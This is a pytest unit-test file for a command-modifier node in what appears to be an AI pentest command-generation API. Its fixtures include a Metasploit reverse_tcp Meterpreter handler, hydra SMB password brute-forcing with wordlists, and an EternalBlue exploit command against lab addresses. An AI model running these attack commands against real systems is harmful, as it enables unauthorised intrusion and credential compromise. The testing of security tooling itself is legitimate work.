"""Unit tests for the command modifier node."""

from unittest.mock import patch

import pytest
from wish_models.test_factories.command_input_factory import CommandInputFactory
from wish_models.test_factories.command_result_factory import CommandResultSuccessFactory
from wish_models.test_factories.settings_factory import SettingsFactory

from wish_command_generation_api.nodes import command_modifier
from wish_command_generation_api.test_factories.graph_state_factory import GraphStateFactory


@pytest.fixture
def settings():
    """Create a settings object for testing."""
    return SettingsFactory()


def test_modify_command_no_commands(settings):
    """Test modifying commands when there are no commands."""
    # Arrange
    state = GraphStateFactory(query="test query", context={})

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert result == state  # Should return the original state unchanged


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_dialog_avoidance(mock_modify, settings, mock_command_response):
    """Test dialog avoidance modification."""
    # Create a state with an interactive command
    state = GraphStateFactory.create_with_command_candidates(
        "Start a Metasploit handler",
        ["msfconsole"]
    )

    # Mock the modifier to return a modified state
    modified_command = (
        "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
        "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
    )
    expected_result = GraphStateFactory.create_with_command_candidates(
        "Start a Metasploit handler",
        [modified_command]
    )
    mock_modify.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "exit -y" in result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_list_files(mock_modify, settings, mock_list_files_response):
    """Test list files modification."""
    # Create a state with a command using list files
    state = GraphStateFactory.create_with_command_candidates(
        "Brute force SMB login",
        ["hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40"]
    )

    # Mock the modifier to return a modified state
    modified_command = (
        "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
        "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
    )
    expected_result = GraphStateFactory.create_with_command_candidates(
        "Brute force SMB login",
        [modified_command]
    )
    mock_modify.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[0].command
    assert "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt" in \
           result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_both_modifications(mock_modify, settings):
    """Test both dialog avoidance and list files modifications."""
    # Create a state with a command needing both modifications
    state = GraphStateFactory.create_with_command_candidates(
        "Download user list from SMB share",
        ["smbclient -N //10.10.10.40/share"]
    )

    # Mock the modifier to return a modified state
    modified_command = (
        "smbclient -N //10.10.10.40/share -c 'get "
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
    )
    expected_result = GraphStateFactory.create_with_command_candidates(
        "Download user list from SMB share",
        [modified_command]
    )
    mock_modify.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "-c 'get" in result.command_candidates[0].command
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command", wraps=command_modifier.modify_command)
def test_modify_command_json_error(mock_modify, settings):
    """Test handling JSON parsing errors."""
    # Create a state with a command
    state = GraphStateFactory.create_with_command_candidates(
        "test_modify_command_json_error",
        ["msfconsole"]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert result.command_candidates[0].command == "msfconsole"  # Original command should be preserved
    assert mock_modify.called


@patch("wish_command_generation_api.nodes.command_modifier.modify_command", wraps=command_modifier.modify_command)
def test_modify_command_exception(mock_modify, settings):
    """Test handling exceptions during command modification."""
    # Create a state with a command
    state = GraphStateFactory.create_with_command_candidates(
        "test_modify_command_exception",
        ["msfconsole"]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert result.command_candidates[0].command == "msfconsole"  # Original command should be preserved
    assert mock_modify.called


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_multiple_commands(mock_modify, settings):
    """Test modifying multiple commands."""
    # Create a state with multiple commands
    state = GraphStateFactory.create_with_command_candidates(
        "Run multiple commands",
        [
            "msfconsole",
            "hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40"
        ]
    )

    # Mock the modifier to return a modified state
    expected_result = GraphStateFactory(
        query="Run multiple commands",
        context={},
        command_candidates=[
            CommandInputFactory(
                command="msfconsole -q -x \"use exploit/multi/handler; exit -y\"",
                timeout_sec=60
            ),
            CommandInputFactory(
                command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40",
                timeout_sec=60
            )
        ]
    )
    mock_modify.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 2
    assert "exit -y" in result.command_candidates[0].command
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[1].command
    assert "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt" in \
           result.command_candidates[1].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_preserve_state(mock_modify, settings):
    """Test that the command modifier preserves other state fields."""
    # Create a state with additional fields
    processed_query = "processed test query"
    failed_command_result = CommandResultSuccessFactory(
        command="test command",
        state="SUCCESS",
        exit_code=0,
        log_summary="success",
    )

    state = GraphStateFactory(
        query="Start Metasploit",
        context={
            "current_directory": "/home/user",
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        processed_query=processed_query,
        command_candidates=[CommandInputFactory(command="msfconsole", timeout_sec=60)],
        failed_command_results=[failed_command_result],
        is_retry=True,
        error_type="TIMEOUT"
    )

    # Mock the modifier to return a modified state
    expected_result = GraphStateFactory(
        query="Start Metasploit",
        context={
            "current_directory": "/home/user",
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        processed_query=processed_query,
        command_candidates=[CommandInputFactory(command="msfconsole -q -x \"exit -y\"", timeout_sec=60)],
        failed_command_results=[failed_command_result],
        is_retry=True,
        error_type="TIMEOUT"
    )
    mock_modify.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert result.query == "Start Metasploit"
    assert result.context == {
        "current_directory": "/home/user",
        "target": {"rhost": "10.10.10.40"},
        "attacker": {"lhost": "192.168.1.5"}
    }
    assert result.processed_query == processed_query
    assert "exit -y" in result.command_candidates[0].command
    assert result.failed_command_results == [failed_command_result]
    assert result.is_retry is True
    assert result.error_type == "TIMEOUT"


def test_msfconsole_lhost_addition(settings):
    """Test that LHOST is added to msfconsole commands with exploit/ modules."""
    # Create a state with a msfconsole command using an exploit module without LHOST
    state = GraphStateFactory(
        query="Exploit EternalBlue",
        context={
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        command_candidates=[
            CommandInputFactory(
                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; run; exit -y\"",
                timeout_sec=60
            )
        ]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "set LHOST 192.168.1.5" in result.command_candidates[0].command
    # Check that LHOST is set after RHOSTS
    command_parts = result.command_candidates[0].command.split(";")
    rhosts_index = next((i for i, part in enumerate(command_parts) if "set RHOSTS" in part), -1)
    lhost_index = next((i for i, part in enumerate(command_parts) if "set LHOST" in part), -1)
    assert rhosts_index != -1 and lhost_index != -1
    assert rhosts_index < lhost_index


def test_msfconsole_with_existing_lhost(settings):
    """Test that LHOST is not duplicated if it already exists in the command."""
    # Create a state with a msfconsole command that already has LHOST set
    state = GraphStateFactory(
        query="Exploit with LHOST",
        context={
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        command_candidates=[
            CommandInputFactory(
                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 192.168.1.5; run; exit -y\"",
                timeout_sec=60
            )
        ]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    # Count occurrences of "set LHOST" - should be exactly one
    assert result.command_candidates[0].command.count("set LHOST") == 1


def test_msfconsole_non_exploit_module(settings):
    """Test that LHOST is not added to msfconsole commands without exploit/ modules."""
    # Create a state with a msfconsole command that doesn't use an exploit module
    state = GraphStateFactory(
        query="Use msfconsole for scanning",
        context={
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        command_candidates=[
            CommandInputFactory(
                command="msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.40; run; exit -y\"",
                timeout_sec=60
            )
        ]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "set LHOST" not in result.command_candidates[0].command


def test_msfconsole_any_exploit_lhost_addition(settings):
    """Test that LHOST is added to any msfconsole commands with 'use exploit/'."""
    # Create a state with a msfconsole command using any exploit module without LHOST
    state = GraphStateFactory(
        query="Use any exploit module",
        context={
            "target": {"rhost": "10.10.10.40"},
            "attacker": {"lhost": "192.168.1.5"}
        },
        command_candidates=[
            CommandInputFactory(
                command="msfconsole -q -x \"use exploit/some/new/module; set RHOSTS 10.10.10.40; run; exit -y\"",
                timeout_sec=60
            )
        ]
    )

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "set LHOST 192.168.1.5" in result.command_candidates[0].command
